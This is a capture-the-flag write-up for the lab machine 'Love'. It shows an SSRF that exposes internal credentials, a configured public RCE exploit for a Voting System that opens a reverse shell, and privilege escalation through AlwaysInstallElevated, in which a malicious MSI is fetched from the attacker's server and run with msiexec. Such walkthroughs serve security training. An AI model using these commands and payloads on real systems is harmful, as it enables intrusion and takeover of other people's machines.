@@ -1,0 +1,119 @@
+Love
+
+5th August 2021 / Document No D21.101.206
+Prepared By: Pwnmeow
+Machine Author: Pwnmeow
+Difficulty: Easy
+Classification: Confidential
+Synopsis
+
+Love is an easy windows machine where it features a voting system application that suffers from an
+authenticated remote code execution vulnerability. Our port scan reveals a service running on port 5000
+where browsing the page we discover that we are not allowed to access the resource. Furthermore a file
+scanner application is running on the same server which is though effected by a SSRF vulnerability where
+it's exploitation gives access to an internal password manager. We can then gather credentials for the voting
+system and by executing the remote code execution attack as phoebe user we get the initial foothold on
+system. Basic windows enumeration reveals that the machine suffers from an elevated misconfiguration.
+Bypassing the applocker restriction we manage to install a malicious msi file that finally results in a reverse
+shell as the system account.
+
+Skills Required
+
+      Windows Enumeration
+      Web Enumeration
+
+Skills Learned
+
+      Exploit modification
+      Server side request forgery
+      Applocker policies
+      Always install everything misconfiguration
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.239 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV 10.10.10.239
+
+The nmap scan reveals that Apache, SMB and MySQL servers are listening on their default ports. Also there
+is ab unrecognised service running on port 5000. The web server is running PHP 7.3.27 as per banner
+grabing done by nmap . Hostname Love is leaked through smb and we also find domain names
+www.love.htb and staging.love.htb from the SSL certificate on port 443.
+We add the domain names to our host file and we start enumerating the HTTP server.
+
+   echo "10.10.10.239 www.love.htb staging.love.htb" > /etc/hosts
+When we browse to www.love.htb, we are presented with a web page of a Voting System .
+
+If we search online about "voting system exploit", we come accross to an authenticated RCE vulnerability in
+the voting system.
+
+Since we don't have aquired any credentials yet, and it is not possible to register an account, we continue to
+search further for more information about the target.
+Upon browsing to staging.love.htb we spot that there is a site that claims to scan files for malware
+signatures. If select the beta option , we are being transfered to beta.php where we locate the File
+Scanning application.
+By trying to visit the www.love.htb:5000 we notice though the following message:
+ You don't have permission to access this resource .
+Furthermore the page allows us to enter an IP address into the URL field. If we try to enter host:port, we see
+that it is actively refusing our request.
+
+However, if we manage to reach http://127.0.0.1:5000/ we can view what is running internally.
+Now it is also possible to extract passwords for the OMRS as shown below, via port 5000.
+Finally, we have the credentials for OMRS admin : @LoveIsInTheAir!!!!
+
+Foothold
+
+Since we have aquired the credentials for the user admin , we are now able to run the authenticated Voting
+System exploit. We first modify some values in the code prior to execution:
+
+   # --- Edit your settings here ----
+   IP = "www.love.htb" # Website's URL
+   USERNAME = "admin" #Auth username
+   PASSWORD = "@LoveIsInTheAir!!!!" # Auth Password
+   REV_IP = "10.10.14.18" # Reverse shell IP
+   REV_PORT = "8888" # Reverse port
+   # --------------------------------
+
+   INDEX_PAGE = f"http://{IP}/admin/index.php"
+   LOGIN_URL = f"http://{IP}/admin/login.php"
+   VOTE_URL = f"http://{IP}/admin/voters_add.php"
+   CALL_SHELL = f"http://{IP}/images/shell.php"
+
+We then start a listener on port 8888.
+
+   nc -lvnp 8888
+
+Finally we run the exploit, and get a reverse shell as user phoebe .
+   $ python3 49445.py
+   Start a NC listner on the port you choose above and run...
+   Logged in
+   Poc sent successfully
+
+Privilege Escalation
+
+By enumerating common windows registry keys, we find AlwaysInstallElevated is set to be enabled.
+   reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+We can exploit this vulnerability and execute our Windows Installer (.msi) payload. However, if we try to run
+the payload it will prove to be unsuccessful.
+Upon further enumeration, we observe that the applocker policy is set and only Phoebe and
+Administrator users are allowed to install MSI files in a specific directory.
+
+   get-applockerpolicy -effective | select -expandproperty rulecollections
+We generate a malicious msi with msfvenom.
+
+We copy our payload to the C:\Administration folder and then run it in another window. We also open a
+python3 server to serve the reverse.msi file.
+
+   python3 -m http.server
+We setup a netcat listener on port 4444 as well.
+
+   rlwrap nc -lvnp 4444
+Finally on windows we download the payload using wget and executing it using msiexec .
+
+   wget 10.10.14.18:8000/reverse.msi -o reverse.msi
+   msiexec /quiet /i reverse.msi
+We check back on our listener to confirm that we got a shell as system.
+   whoami
+
